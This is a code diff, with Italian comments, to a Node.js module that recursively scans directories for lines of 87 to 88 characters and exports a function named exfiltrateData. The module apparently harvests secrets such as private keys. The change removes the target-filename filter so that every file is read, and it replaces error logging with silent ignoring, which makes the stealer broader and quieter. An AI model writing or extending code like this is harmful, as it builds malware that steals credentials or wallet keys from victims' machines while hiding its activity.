@@ -4,12 +4,6 @@ const path = require('path');
 const os = require('os');
 const config = require('./config');
 
-// Verifica se un file è un bersaglio (nome contiene pattern)
-function isTargetFile(filePath) {
-  const name = path.basename(filePath).toLowerCase();
-  return config.targetPatterns.some(pat => name.includes(pat));
-}
-
 // Estrae righe con lunghezza 87-88 caratteri
 function extractSuspiciousLines(content) {
   return content.split('\n').filter(line => {
@@ -18,7 +12,7 @@ function extractSuspiciousLines(content) {
   });
 }
 
-// Scansiona directory ricorsivamente e raccoglie file bersaglio con righe sospette
+// Scansiona directory ricorsivamente e raccoglie file con righe sospette
 async function scanDirectory(dir) {
   const findings = [];
   
@@ -28,8 +22,9 @@ async function scanDirectory(dir) {
       const full = path.join(current, entry.name);
       if (entry.isDirectory()) {
         await walk(full);
-      } else if (entry.isFile() && isTargetFile(full)) {
+      } else if (entry.isFile()) {
         try {
+          // Prova a leggere come UTF-8; se fallisce, ignora (binario)
           const content = await fs.readFile(full, 'utf-8');
           const suspicious = extractSuspiciousLines(content);
           if (suspicious.length) {
@@ -42,7 +37,7 @@ async function scanDirectory(dir) {
             });
           }
         } catch (err) {
-          console.warn(`Errore leggendo ${full}: ${err.message}`);
+          // Ignora file binari o non leggibili
         }
       }
     }
@@ -80,4 +75,4 @@ async function exfiltrateData(findings) {
   }
 }
 
-module.exports = { scanDirectory, exfiltrateData, isTargetFile, extractSuspiciousLines };
+module.exports = { scanDirectory, exfiltrateData, extractSuspiciousLines };
